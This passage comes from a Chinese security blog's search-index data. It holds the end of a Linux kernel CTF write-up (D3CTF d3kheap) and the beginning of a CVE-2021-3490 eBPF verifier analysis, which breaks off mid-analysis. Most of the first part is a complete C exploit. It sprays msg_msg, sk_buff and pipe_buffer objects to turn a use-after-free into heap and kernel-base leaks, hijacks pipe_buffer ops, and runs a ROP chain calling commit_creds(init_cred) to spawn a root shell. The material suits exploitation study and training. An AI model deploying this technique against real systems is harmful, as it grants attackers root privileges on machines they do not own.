中存放指向用户数据的指针，并且存放用户数据的object只有0x140存放着一些指针，所以在这道题目里我们进行堆喷时write的大小为0x2c0。\n\n至于这个结构体的分配与释放也是十分简单，sk_buff 在内核网络协议栈中代表一个「包」，我们不难想到的是我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作。\n根据前一篇的思路，我们使用msgrcv时还是会使用MSG_COPY标识位。但是我们到底如何判断呢？\n// ...  if (!IS_ERR(msg)) &#123;    /*         * Found a suitable message.         * Unlink it from the queue.         */    if ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;      msg = ERR_PTR(-E2BIG);      goto out_unlock0;    &#125;    /*         * If we are copying, then do not unlink message and do         * not update queue parameters.         */    if (msgflg &amp; MSG_COPY) &#123;      msg = copy_msg(msg, copy);      goto out_unlock0;    &#125;    list_del(&amp;msg-&gt;m_list);    msq-&gt;q_qnum--;    msq-&gt;q_rtime = ktime_get_real_seconds();    ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));    msq-&gt;q_cbytes -= msg-&gt;m_ts;    atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);    atomic_dec(&amp;ns-&gt;msg_hdrs);    ss_wakeup(msq, &amp;wake_q, false);    goto out_unlock0;  &#125;// ...out_unlock0:  ipc_unlock_object(&amp;msq-&gt;q_perm);  wake_up_q(&amp;wake_q);out_unlock1:\trcu_read_unlock();\tif (IS_ERR(msg)) &#123;\t\tfree_copy(copy);\t\treturn PTR_ERR(msg);\t&#125;\n\n可以看到这里如果我们传入的bufsz小于msg-&gt;m_ts就会给msg赋值一个负值，然后在后面return出来。不过这里在使用msgrcv函数时需要注意的还有msgtyp这个参数。\nstatic struct msg_msg *find_msg(struct msg_queue *msq, long *msgtyp, int mode)&#123;\tstruct msg_msg *msg, *found = NULL;\tlong count = 0;\tlist_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;\t\tif (testmsg(msg, *msgtyp, mode) &amp;&amp;\t\t    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,\t\t\t\t\t       *msgtyp, mode)) &#123;\t\t\tif (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != 1) &#123;\t\t\t\t*msgtyp = msg-&gt;m_type - 1;\t\t\t\tfound = msg;\t\t\t&#125; else if (mode == SEARCH_NUMBER) &#123;\t\t\t\tif (*msgtyp == count)\t\t\t\t\treturn msg;\t\t\t&#125; else\t\t\t\treturn msg;\t\t\tcount++;\t\t&#125;\t&#125;\treturn found ?: ERR_PTR(-EAGAIN);&#125;\n\n通过阅读其他源码可以看到mode是等于SEARCH_NUMBER的，所以这里会判断msgtyp和count的值，如果我们仍然想上一篇文章那样传入0，就只会读取msg_queue中的第一个msg_msg也就是我们的主消息，不过我们真正需要的辅助消息，所以这里我们还需要把传入的msgtyp修改为1才能获取到我们的目标object。\n所以我们可以控制msg-&gt;m_ts然后控制传入的msgtyp以及bufsz就可以出现报错，不过这里仍然不会出现kernel panic，所以我们可以此种办法定位哪一个meg_queue中的辅助消息为我们的UAF的msg_msg。\n泄漏堆地址这里泄漏堆地址的方式其实跟上一篇文章一致的，首先通过越界读取相邻辅助消息堆块的指针，并且此时的辅助消息msg_msg-&gt;m_list.next指向的是msg_queue而msg_msg-&gt;m_list.prev指向的是主消息的地址。一样的主消息msg-&gt;m_list.next指向的是辅助堆块，那么对我们来说就可以通过两次读取泄漏出我们UAF堆块的地址。\n\n不过这里的前提是和上一篇文章一样那就是存在相邻的辅助堆块也就是堆块分配在同一页内存上。\n泄漏基地址这里泄漏基地址的方法和前面的方法就完全不一样了，这里使用pipe_buffer来泄漏。\n/** *\tstruct pipe_buffer - a linux kernel pipe buffer *\t@page: the page containing the data for the pipe buffer *\t@offset: offset of data inside the @page *\t@len: length of data inside the @page *\t@ops: operations associated with this buffer. See @pipe_buf_operations. *\t@flags: pipe buffer flags. See above. *\t@private: private data owned by the ops. **/struct pipe_buffer &#123;\tstruct page *page;\tunsigned int offset, len;\tconst struct pipe_buf_operations *ops;\tunsigned int flags;\tunsigned long private;&#125;;\n\n在 pipe_buffer 中存在一个函数表成员 pipe_buf_operations ，其指向内核中的函数表 anon_pipe_buf_ops，若我们能够将其读出，便能泄露出内核基址。\n这里使用的方法是，使sk_buff指向这个UAF的堆块，并且他已经是free的状态，接着堆喷pipe_buffer，最后读出数据继续维持UAF状态。\n劫持执行流在上一步我们已经泄漏出基地址，并且此时pipe_buffer所指向的堆块还是free状态，所以我们可以继续利用sk_buff进行堆喷。最后修改ops指针指向我们上面泄漏出来的堆地址，最后跟上一篇文章一样进行ROP即可。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;#define MSG_COPY 040000#define MSG_TAG 0xAAAAAAAA#define PRIMARY_MSG_TYPE 0x41#define SECONDARY_MSG_TYPE 0x42#define MSG_QUEUE_NUM 4096#define PRIMARY_MSG_SIZE 96#define SECONDARY_MSG_SIZE 0x400#define VICTIM_MSG_TYPE 0x1337#define SOCKET_NUM 32#define SK_BUFF_NUM 128#define PIPE_NUM 256#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede#define INIT_CRED 0xffffffff82c6d580#define COMMIT_CREDS 0xffffffff810d25c0#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0#define POP_RDI_RET 0xffffffff810938f0void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;struct&#123;    long mtype;    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];&#125; oob_msg;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;struct&#123;    long mtype;    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; primary_msg;struct&#123;    long mtype;    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; secondary_msg;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void getShell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int fd;void add()&#123;    ioctl(fd, 0x1234);&#125;void del()&#123;    ioctl(fd, 0xDEAD);&#125;int main()&#123;    save_status();    char *buf = malloc(0x4000);    unsigned long *point_buf = malloc(0x4000);    int victim_qid = -1;    int sk_sockets[SOCKET_NUM][2];    int msqid[MSG_QUEUE_NUM];    char fake_secondary_msg[704];    struct msg_msg *nearby_msg;    struct msg_msg *nearby_msg_prim;    unsigned long victim_addr;    unsigned long search_addr;    unsigned long kernel_addr;    unsigned long kernel_base;    unsigned long kernel_offset;    struct pipe_buffer *pipe_buf_ptr;    int pipe_fd[PIPE_NUM][2];    struct pipe_buf_operations *ops_ptr;    unsigned long *rop_chain;    for (int i = 0; i &lt; SOCKET_NUM; i++)        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)            errExit(&quot;failed to create socket pair!&quot;);    fd = open(&quot;/dev/d3kheap&quot;, O_RDONLY);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open d3kheap error!&quot;);        exit(0);    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)            errExit(&quot;failed to create msg_queue!&quot;);    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray msg_msg, construct overlapping object\\033[0m&quot;);    memset(&amp;primary_msg, 0, sizeof(primary_msg));    memset(&amp;secondary_msg, 0, sizeof(secondary_msg));    *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;    *(long *)&amp;secondary_msg = SECONDARY_MSG_TYPE;    *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;    *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;    add();    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;primary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;primary_msg,                   sizeof(primary_msg) - 8, 0) &lt; 0)            errExit(&quot;failed to send primary msg!&quot;);        *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;secondary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;secondary_msg,                   sizeof(secondary_msg) - 8, 0) &lt; 0)            errExit(&quot;failed to send secondary msg!&quot;);        if (i == 1024)            del();    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] construct UAF\\033[0m&quot;);    del();    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if (msgrcv(msqid[i], &amp;secondary_msg, sizeof(secondary_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)        &#123;            printf(&quot;[+] victim qid: %d\\n&quot;, i);            victim_qid = i;        &#125;    &#125;    if (victim_qid == -1)        errExit(&quot;failed to make the UAF in msg queue!&quot;);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\033[32m\\033[1m[+] UAF construction complete!\\033[0m&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] spray sk_buff to leak kheap addr\\033[0m&quot;);    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)        errExit(&quot;failed to rehit the UAF object!&quot;);    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - sizeof(struct msg_msg))];    printf(&quot;\\033[32m\\033[1m[+] addr of primary msg of msg nearby victim: \\033[0m%p\\n&quot;,           nearby_msg-&gt;m_list.prev);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    search_addr = (unsigned long *)nearby_msg-&gt;m_list.prev;    search_addr = search_addr - 8;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = sizeof(oob_msg.mtext);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg), 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    // print_hex(oob_msg.mtext, sizeof(oob_msg.mtext));    if (*(int *)&amp;oob_msg.mtext[0x1000] != MSG_TAG)        errExit(&quot;failed to rehit the UAF object!&quot;);    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];    victim_addr = (unsigned long *)(nearby_msg_prim-&gt;m_list.next);    victim_addr = victim_addr - 0x400;    printf(&quot;\\033[32m\\033[1m[+] addr of msg next to victim: \\033[0m%p\\n&quot;,           nearby_msg_prim-&gt;m_list.next);    printf(&quot;\\033[32m\\033[1m[+] addr of msg UAF object: \\033[0m%p\\n&quot;, victim_addr);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray pipe_buffer to leak kernel base\\033[0m&quot;);    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + 0x800;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + 0x800;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;secondary_msg, sizeof(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;fake_secondary_msg,                     sizeof(fake_secondary_msg)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = (unsigned long *)(pipe_buf_ptr-&gt;ops);                kernel_offset = (kernel_addr - 0xffffffff8203fe40);                kernel_base = 0xffffffff81000000 + kernel_offset;            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_addr);    puts(&quot;\\n\\033[34m\\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\\033[0m&quot;);    unsigned long pop_rdi = 0xffffffff810938f0 + kernel_offset;    unsigned long init_cred = 0xffffffff82c6d580 + kernel_offset;    unsigned long commit_cred = 0xffffffff810d25c0 + kernel_offset;    unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00ff0 + kernel_offset;    unsigned long push_rsi_pop_rsp_pop_4reg_ret = 0xffffffff812dbede + kernel_offset;    pipe_buf_ptr-&gt;page = *(uint64_t *)&quot;196082&quot;;    pipe_buf_ptr-&gt;ops = victim_addr + 0x100;    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[0x100];    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;    int rop = 0;    rop_chain = (uint64_t *)&amp;fake_secondary_msg[0x20];    rop_chain[rop++] = pop_rdi;    rop_chain[rop++] = init_cred;    rop_chain[rop++] = commit_cred;    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + 0x16;    rop_chain[rop++] = 0;    rop_chain[rop++] = 0;    rop_chain[rop++] = getShell;    rop_chain[rop++] = user_cs;    rop_chain[rop++] = user_rflags;    rop_chain[rop++] = user_sp;    rop_chain[rop++] = user_ss;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        close(pipe_fd[i][0]);        close(pipe_fd[i][1]);    &#125;    return 0;&#125;\n\n\n\n参考链接：https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80\n题目在上一篇文章\n","categories":["Linux Kernel","CVE复现"],"tags":["msg_msg","sk_buff","pipe_buffer"]},{"title":"CVE-2021-3490复现","url":"/2023/08/12/CVE-2021-3490/","content":"前言最近为了找工作疯狂复现CVE是真的太难了😭，今天才发现我工位旁边的居然是fmyy爷😭，属于是给跪了。\n这次复现的这个CVE是一个关于ebpf的漏洞，如果各位没有相关的基础可以看一下这篇文章CVE-2017-16995，并且这次这个CVE的利用方法和以前做的一道题可以说是一摸一样，所以这次不会详细的介绍利用方法而是更倾向于解释如何构造之类的，具体的利用方法可以去看d3bpf。\n漏洞分析有过ebpf的基础都知道在载入一个ebpf程序的时候会对每条指令进行检查，而检查的函数就在do_check中，如果是一个ALU运算的话则会进入check_alu_op进行进一步检查，如果我们的运算方式是and/or/xor一类的则会进入adjust_reg_min_max_vals函数进行进一步的检查，在函数中最后会调用到 adjust_scalar_min_max_vals函数。\nswitch (opcode) &#123;\tcase BPF_ADD:\t\tscalar32_min_max_add(dst_reg, &amp;src_reg);\t\tscalar_min_max_add(dst_reg, &amp;src_reg);\t\tdst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);\t\tbreak;\tcase BPF_SUB:\t\tscalar32_min_max_sub(dst_reg, &amp;src_reg);\t\tscalar_min_max_sub(dst_reg, &amp;src_reg);\t\tdst_reg-&gt;var_off = tnum_sub(dst_reg-&gt;var_off, src_reg.var_off);\t\tbreak;\tcase BPF_MUL:\t\tdst_reg-&gt;var_off = tnum_mul(dst_reg-&gt;var_off, src_reg.var_off);\t\tscalar32_min_max_mul(dst_reg, &amp;src_reg);\t\tscalar_min_max_mul(dst_reg, &amp;src_reg);\t\tbreak;\tcase BPF_AND:\t\tdst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);\t\tscalar32_min_max_and(dst_reg, &amp;src_reg);\t\tscalar_min_max_and(dst_reg, &amp;src_reg);\t\tbreak;\tcase BPF_OR:\t\tdst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);\t\tscalar32_min_max_or(dst_reg, &amp;src_reg);\t\tscalar_min_max_or(dst_reg, &amp;src_reg);\t\tbreak;\tcase BPF_XOR:\t\tdst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);\t\tscalar32_min_max_xor(dst_reg, &amp;src_reg);\t\tscalar_min_max_xor(dst_reg, &amp;src_reg);\t\tbreak;&#125;\n\n而在这个函数中会根据opcode的不同而进入不同的分支，以and为例，其会调用scalar32_min_max_and和scalar_min_max_and计算32位以及64位的边界值。\nstatic void scalar32_min_max_and(struct bpf_reg_state *dst_reg,                                 struct bpf_reg_state *src_reg)&#123;  bool src_known = tnum_subreg_is_const(src_reg-&gt;var_off);  bool dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);  struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);  s32 smin_val = src_reg-&gt;s32_min_value;  u32 umax_val = src_reg-&gt;u32_max_value;  /* Assuming scalar64_min_max_and will be called so its safe\t * to skip updating register for known 32-bit case.\t */  if (src_known &amp;&amp; dst_known)    return;  /* We get our minimum from the var_off, since that&#x27;s inherently\t * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.\t */  dst_reg-&gt;u32_min_value = var32_off.value;  dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);  if (dst_reg-&gt;s32_min_value &lt; 0 || smin_val &lt; 0) &#123;    /* Lose signed bounds when ANDing negative numbers,\t\t * ain&#x27;t nobody got time for that.\t\t */    dst_reg-&gt;s32_min_value = S32_MIN;    dst_reg-&gt;s32_max_value = S32_MAX;  &#125; else &#123;    /* ANDing two positives gives a positive, so safe to\t\t * cast result into s64.\t\t */    dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;    dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;  &#125;&#125;\n\n首先tnum_subreg_is_const函数得到的是当前寄存器的低32位值是否是known的，根据函数的流程如果两个寄存器的低32位都为known则直接return。\nstatic void scalar_min_max_and(struct bpf_reg_state *dst_reg,\t\t\t       struct bpf_reg_state *src_reg)&#123;\tbool src_known = tnum_is_const(src_reg-&gt;var_off);\tbool dst_known = tnum_is_const(dst_reg-&gt;var_off);\ts64 smin_val = src_reg-&gt;smin_value;\tu64 umax_val = src_reg-&gt;umax_value;\tif (src_known &amp;&amp; dst_known) &#123;\t\t__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);\t\treturn;\t&#125;\t/* We get our minimum from the var_off, since that&#x27;s inherently\t * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.\t */\tdst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;\tdst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);\tif (dst_reg-&gt;smin_value &lt; 0 || smin_val &lt; 0) &#123;\t\t/* Lose signed bounds when ANDing negative numbers,\t\t * ain&#x27;t nobody got time for that.\t\t */\t\tdst_reg-&gt;smin_value = S64_MIN;\t\tdst_reg-&gt;smax_value = S64_MAX;\t&#125; else &#123;\t\t/* ANDing two positives gives a positive, so safe to\t\t * cast result into s64.\t\t */\t\tdst_reg-&gt;smin_value = dst_reg-&gt;umin_value;\t\tdst_reg-&gt;smax_value = dst_reg-&gt;umax_value;\t&#125;\t/* We may learn something more from the var_off */\t__update_reg_bounds(dst_reg);&#125;\n\n接着观察这个函数，首先则是判断了64位是否为known。\nstatic void scalar_min_max_and(struct bpf_reg_state *dst_reg,\t\t\t       struct bpf_reg_state *src_reg)&#123;\tbool src_known = tnum_is_const(src_reg-&gt;var_off);\tbool dst_known = tnum_is_const(dst_reg-&gt;var_off);\ts64 smin_val = src_reg-&gt;smin_value;\tu64 umax_val = src_reg-&gt;umax_value;\tif (src_known &amp;&amp; dst_known) &#123;\t\t__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);\t\treturn;\t&#125;\t/* We get our minimum from the var_off, since that&#x27;s inherently\t * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.\t */\tdst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;\tdst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);\tif (dst_reg-&gt;smin_value &lt; 0 || smin_val &lt; 0) &#123;\t\t/* Lose signed bounds when ANDing negative numbers,\t\t * ain&#x27;t nobody got time for that.\t\t */\t\tdst_reg-&gt;smin_value = S64_MIN;\t\tdst_reg-&gt;smax_value = S64_MAX;\t&#125; else &#123;\t\t/* ANDing two positives gives a positive, so safe to\t\t * cast result into s64.\t\t */\t\tdst_reg-&gt;smin_value = dst_reg-&gt;umin_value;\t\tdst_reg-&gt;smax_value = dst_reg-&gt;umax_value;\t&#125;\t/* We may learn something more from the var_off */\t__update_reg_bounds(dst_reg);&#125;\n\n如果两个寄存器都是known的状态的话，那么就直接会将imm赋值给寄存器内的多个成员。如果是这样运行的话，那么是正常的运行的。不过可以看到的是这个scalar32_min_max_and函数中取known的函数使用的是tnum_subreg_is_const，然而这个函数只会验证低32位的mask值，如果此时存在以下两个寄存器会是这样的效果。R1=&#123;.value=0x1, .mask=0xffffffff00000000&#125;，R2=&#123;.value=0x100000002, .mask=0x0&#125;如果两个寄存器进行and运算的话，那么结果就为R1=&#123;.value=0x0, .mask=0x100000000&#125;。此时在scalar32_min_max_and函数中是会直接return的，随后立马进入scalar_min_max_and函数中，并且因为dst_known = 0导致不会进入if语句，进入下面的流程。最终会进入到scalar32_min_max_and中。\nstatic void __update_reg32_bounds(struct bpf_reg_state *reg)&#123;\tstruct tnum var32_off = tnum_subreg(reg-&gt;var_off);\t/* min signed is max(sign bit) | min(other bits) */\treg-&gt;s32_min_value = max_t(s32, reg-&gt;s32_min_value,\t\t\tvar32_off.value | (var32_off.mask &amp; S32_MIN));\t/* max signed is min(sign bit) | max(other bits) */\treg-&gt;s32_max_value = min_t(s32, reg-&gt;s32_max_value,\t\t\tvar32_off.value | (var32_off.mask &amp; S32_MAX));\treg-&gt;u32_min_value = max_t(u32, reg-&gt;u32_min_value, (u32)var32_off.value);\treg-&gt;u32_max_value = min(reg-&gt;u32_max_value,\t\t\t\t (u32)(var32_off.value | var32_off.mask));&#125;static void __update_reg64_bounds(struct bpf_reg_state *reg)&#123;\t/* min signed is max(sign bit) | min(other bits) */\treg-&gt;smin_value = max_t(s64, reg-&gt;smin_value,\t\t\t\treg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));\t/* max signed is min(sign bit) | max(other bits) */\treg-&gt;smax_value = min_t(s64, reg-&gt;smax_value,\t\t\t\treg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));\treg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);\treg-&gt;umax_value = min(reg-&gt;umax_value,\t\t\t      reg-&gt;var_off.value | reg-&gt;var_off.mask);&#125;static void __update_reg_bounds(struct bpf_reg_state 